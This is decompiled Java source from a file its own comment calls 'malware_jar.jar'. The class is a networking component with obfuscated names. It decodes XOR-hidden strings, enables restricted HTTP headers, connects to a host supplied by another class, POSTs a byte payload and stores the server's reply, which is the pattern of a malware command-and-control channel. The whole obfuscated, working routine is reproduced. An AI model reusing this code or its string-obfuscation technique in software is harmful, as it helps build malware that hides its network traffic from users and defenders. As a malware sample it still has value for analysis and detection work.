package p7c27dba0.p7c27dba0.p5919d155;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/* renamed from: p7c27dba0.p7c27dba0.p5919d155.p94c68b94 */
/* loaded from: malware_jar.jar:p7c27dba0/p7c27dba0/p5919d155/p94c68b94.class */
public class C0223p94c68b94 {

    /* renamed from: $ */
    private static short[] f1358$ = {7932, 7930, 7905, 7841, 7905, 7914, 7931, 7841, 7911, 7931, 7931, 7935, 7841, 7918, 7907, 7907, 7904, 7928, 7901, 7914, 7932, 7931, 7933, 7910, 7916, 7931, 7914, 7915, 7879, 7914, 7918, 7915, 7914, 7933, 7932, 287, 281, 286, 270, 8920, 8900, 8900, 8896, 8899, 8842, 8863, 8863, 7668, 7656, 7656, 7660, 7590, 7603, 7603, 5944, 4575, 4544, 4572, 4571, 4883, 4881, 4864, 754, 734, 735, 735, 724, 722, 709, 728, 734, 735, 5786, 5781, 5782, 5770, 5788, 9102, 9122, 9123, 9145, 9128, 9123, 9145, 9184, 9089, 9128, 9123, 9130, 9145, 9125};

    /* renamed from: a */
    public String f1359a = null;

    /* renamed from: b */
    public byte[] f1360b = null;

    /* renamed from: c */
    public boolean f1361c = true;

    /* renamed from: d */
    public String f1362d = null;

    /* renamed from: e */
    public int f1363e = 80;

    /* renamed from: f */
    public byte[] f1364f = null;

    /* renamed from: g */
    public boolean f1365g = false;

    /* renamed from: h */
    public String[][] f1366h = null;

    /* renamed from: $ */
    private static String m1484$(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) (f1358$[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public C0223p94c68b94() {
        if ((2 + 19) % 19 <= 0) {
        }
    }

    /* renamed from: a */
    public boolean m1483a() {
        Throwable th;
        HttpURLConnection httpURLConnection;
        if ((9 + 8) % 8 <= 0) {
        }
        System.setProperty(m1484$(0, 35, 7823), m1484$(35, 39, 363));
        InputStream inputStream = null;
        HttpURLConnection httpURLConnection2 = null;
        HttpURLConnection httpURLConnection3 = null;
        InputStream inputStream2 = null;
        try {
            if (this.f1359a == null) {
                this.f1359a = C0229pecfd3560.m9347a69b();
            }
            StringBuilder sb = new StringBuilder();
            sb.append(this.f1365g ? m1484$(39, 47, 8880) : m1484$(47, 54, 7580));
            sb.append(this.f1359a);
            sb.append(m1484$(54, 55, 5890));
            sb.append(this.f1363e);
            sb.append("");
            sb.append(this.f1362d);
            httpURLConnection = (HttpURLConnection) new URL(sb.toString()).openConnection();
        } catch (Exception e) {
            inputStream = null;
        } catch (Throwable th2) {
            th = th2;
            inputStream2 = null;
        }
        try {
            httpURLConnection.setRequestMethod(this.f1361c ? m1484$(55, 59, 4495) : m1484$(59, 62, 4948));
            httpURLConnection.setUseCaches(false);
            httpURLConnection.setConnectTimeout(15000);
            httpURLConnection.setReadTimeout(15000);
            if (this.f1366h != null) {
                int i = 0;
                while (true) {
                    String[][] strArr = this.f1366h;
                    if (i >= strArr.length) {
                        break;
                    }
                    if (strArr[i].length == 2) {
                        httpURLConnection.setRequestProperty(strArr[i][0], strArr[i][1]);
                    }
                    i++;
                }
            }
            httpURLConnection.setRequestProperty(m1484$(62, 72, 689), m1484$(72, 77, 5881));
            if (this.f1361c) {
                httpURLConnection.setDoOutput(true);
                httpURLConnection.setRequestProperty(m1484$(77, 91, 9165), Integer.toString(this.f1360b.length));
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
                byte[] bArr = this.f1360b;
                dataOutputStream.write(bArr, 0, bArr.length);
                dataOutputStream.close();
            }
            InputStream inputStream3 = httpURLConnection.getInputStream();
            ArrayList arrayList = new ArrayList();
            byte[] bArr2 = new byte[4096];
            int i2 = 0;
            while (true) {
                int read = inputStream3.read(bArr2, 0, 4096);
                if (read <= 0) {
                    break;
                }
                i2 += read;
                byte[] bArr3 = new byte[read];
                System.arraycopy(bArr2, 0, bArr3, 0, read);
                arrayList.add(bArr3);
            }
            if (i2 == 0) {
                try {
                    httpURLConnection.disconnect();
                    inputStream3.close();
                    return true;
                } catch (Exception e2) {
                    return true;
                }
            } else {
                this.f1364f = new byte[i2];
                int i3 = 0;
                int i4 = 0;
                while (true) {
                    inputStream2 = inputStream3;
                    inputStream = inputStream3;
                    if (i3 < arrayList.size()) {
                        byte[] bArr4 = (byte[]) arrayList.get(i3);
                        System.arraycopy(bArr4, 0, this.f1364f, i4, bArr4.length);
                        i4 += bArr4.length;
                        i3++;
                    } else {
                        try {
                            httpURLConnection.disconnect();
                            inputStream3.close();
                            return true;
                        } catch (Exception e3) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e4) {
            httpURLConnection3 = httpURLConnection;
            if (httpURLConnection3 != null) {
                try {
                    httpURLConnection3.disconnect();
                } catch (Exception e5) {
                    return false;
                }
            }
            if (inputStream == null) {
                return false;
            }
            inputStream.close();
            return false;
        } catch (Throwable th3) {
            th = th3;
            httpURLConnection2 = httpURLConnection;
            if (httpURLConnection2 != null) {
                try {
                    httpURLConnection2.disconnect();
                } catch (Exception e6) {
                    throw th;
                }
            }
            if (inputStream2 != null) {
                inputStream2.close();
            }
            throw th;
        }
    }
}
